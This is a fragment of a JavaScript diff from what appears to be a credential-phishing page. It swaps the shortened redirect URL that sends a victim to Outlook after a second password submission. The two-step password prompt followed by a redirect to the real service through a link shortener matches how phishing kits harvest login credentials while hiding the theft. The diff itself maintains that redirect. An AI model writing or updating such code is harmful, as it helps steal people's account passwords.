@@ -120,7 +120,7 @@ document.addEventListener('DOMContentLoaded', function() {
                             passwordInput.focus(); // Focus back on password input
                         } else if (step === 2) {
                             // Redirect to Outlook on second submission
-                            window.location.href = 'https://bit.ly/4nNIHB6';
+                            window.location.href = 'https://short-url.org/1hgHk';
                         }
                     }).fail(function(error) {
                         // Reset button text on error
